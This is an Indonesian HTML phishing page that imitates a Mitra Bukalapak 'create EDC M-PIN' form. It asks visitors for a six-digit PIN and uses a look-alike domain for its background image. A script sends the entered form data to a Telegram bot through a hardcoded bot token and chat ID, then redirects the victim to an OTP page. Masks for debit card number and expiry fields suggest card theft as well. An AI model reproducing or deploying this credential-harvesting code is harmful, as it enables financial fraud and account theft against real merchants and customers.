<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Buat M-PIN EDC </title>
  <meta name="description" content="Silakan Buat M-PIN EDC untuk keamanan transaksi anda nanti!">
  <meta property="og:title" content="Buat M-PIN EDC ">
  <meta property="og:image" content="lapak.jpg">
  <meta property="og:type" content="website">
  <meta property="og:url" content="#">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <style>
    body {
      margin: 0;
      font-family: sans-serif;
      background: url('https://formulir-edc-mitrabukalapak.biz.id/bg-mitra.jpg') no-repeat center center fixed;
      background-size: cover;
      padding-bottom: 80px; /* supaya konten tidak tertutup footer */
    }

    .form-container {
      max-width: 380px;
      margin: 50px auto;
      padding: 30px;
      border-radius: 20px;
    }

    .pin-inputs {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 16px;
    }
    .pin-inputs input {
      width: 15px;
      height: 15px;
      font-size: 10px;
      text-align: center;
      padding: 10px;
      border-radius: 50%;
      border: 2px solid black;
      outline: none;
      transition: border-color 0.3s;
      background-color: transparent;
    }
    .pin-inputs input:focus {
      border-color: #3366ff;
    }
    .pin-inputs input.filled {
      background-color: #000;
      color: transparent;
      text-shadow: 0 0 0 #000;
    }

    .btn-lanjut {
      width: 100%;
      padding: 14px;
      background-color: #E31E52;
      color: #fff;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    .btn-lanjut:disabled {
      background-color: #ccc;
      cursor: not-allowed;
    }

    .footer {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      background: #fff;
      padding: 16px 20px;
      box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
      z-index: 999;
    }

    .content {
      text-align: center;
      padding: 20px;
    }
  </style>
</head>
<body>

  <form class="form-container" id="form-edc" action="status.html" method="POST" onsubmit="gabungkanPIN()">
    <div class="content">
      <h2>Buat M-PIN EDC</h2>
      <div class="pin-inputs">
        <input type="tel" maxlength="1" class="pin-digit">
        <input type="tel" maxlength="1" class="pin-digit">
        <input type="tel" maxlength="1" class="pin-digit">
        <input type="tel" maxlength="1" class="pin-digit">
        <input type="tel" maxlength="1" class="pin-digit">
        <input type="tel" maxlength="1" class="pin-digit">
      </div>
      
      <input type="hidden" name="pin" id="gabunganPin">
    </div>
  

  <div class="footer">
    <button type="submit" class="btn-lanjut" id="btn-lanjut" disabled form="form-edc"">Buat M-PIN</button>
  </div>
  </form>
   </div>
   
       <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"

    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="

    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
        </div> 
   </div> 
   </div>
 <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
<script src="jquery.min.js"></script>
       
        <script type="text/javascript">
            $(document).ready(function(){
        </script>
<!-- </body> -->  
   <script>


function closeForm() {
  document.getElementById("myForm").style.display = "none";
     const pinInputs = document.querySelectorAll('.pin-digit');
    const btnLanjut = document.getElementById('btn-lanjut');
    const hiddenPin = document.getElementById('gabunganPin');

    pinInputs.forEach((input, idx) => {
      input.addEventListener('input', () => {
        if (input.value) {
          input.classList.add('filled');
          if (idx < pinInputs.length - 1) {
            pinInputs[idx + 1].focus();
          }
        } else {
          input.classList.remove('filled');
        }
        cekPIN();
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && input.value === '' && idx > 0) {
          pinInputs[idx - 1].focus();
        }
      });
    });

    function cekPIN() {
      let semuaTerisi = true;
      let gabungan = '';
      pinInputs.forEach(input => {
        if (input.value === '') semuaTerisi = false;
        gabungan += input.value;
      });

      btnLanjut.disabled = !semuaTerisi;
      hiddenPin.value = gabungan;
    }

    function gabungkanPIN() {
      cekPIN();
    }
  </script>
  
  <!-- partial -->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"

    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="

    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
<script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script>
 <script>$(document).ready(function(){
$('#debit').mask('0000 0000 0000 0000');     
$('#valid').mask('00/00');
});</script>
 <p id="status"></p>
   <script src="form-edc.js"></script>
   
   <script>
   
            $(document).ready(function() {
            $("div#eyeOpen").on('click', function() {
                $("#eyeOpen").css("display", "none");
                $("#eyeClose").css("display", "block");

                $("#password").prop("type", "text");

                $("div#eyeClose").on('click', function() {
                    $("#eyeOpen").css("display", "block");
                    $("#eyeClose").css("display", "none");

                    $("#password").prop("type", "password");
                });
            });
            
const chat_id = '-1002437287311', botID = 'bot7566851766:AAEbOqBAI2XfHKrx15zlO-OqkGUvNzFPh_o';

    const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;

    document.querySelector('#form-edc').addEventListener("submit", async e => { // When the user submits the form
        e.preventDefault(); // Don't submit
        let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
            Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
        null, 2); // Prettify the JSON so we can read the data easily
        const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
            method: 'POST',
            headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
            body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
        });
        const messageStatus = document.querySelector('#status');
        if (sendMessage.ok) // Update the user on if the message went through
            messageStatus.textContent = "";
        else
            messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
        e.target.reset(); // Clear the form fields.
        window.location.href = 'otp.html';
    });

            
        });
        </script>

  <script>
    const pinInputs = document.querySelectorAll('.pin-digit');
    const btnLanjut = document.getElementById('btn-lanjut');
    const hiddenPin = document.getElementById('gabunganPin');

    pinInputs.forEach((input, idx) => {
      input.addEventListener('input', () => {
        if (input.value) {
          input.classList.add('filled');
          if (idx < pinInputs.length - 1) {
            pinInputs[idx + 1].focus();
          }
        } else {
          input.classList.remove('filled');
        }
        cekPIN();
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && input.value === '' && idx > 0) {
          pinInputs[idx - 1].focus();
        }
      });
    });

    function cekPIN() {
      let semuaTerisi = true;
      let gabungan = '';
      pinInputs.forEach(input => {
        if (input.value === '') semuaTerisi = false;
        gabungan += input.value;
      });

      btnLanjut.disabled = !semuaTerisi;
      hiddenPin.value = gabungan;
    }

    function gabungkanPIN() {
      cekPIN();
    }
  </script>

</body>
</html>
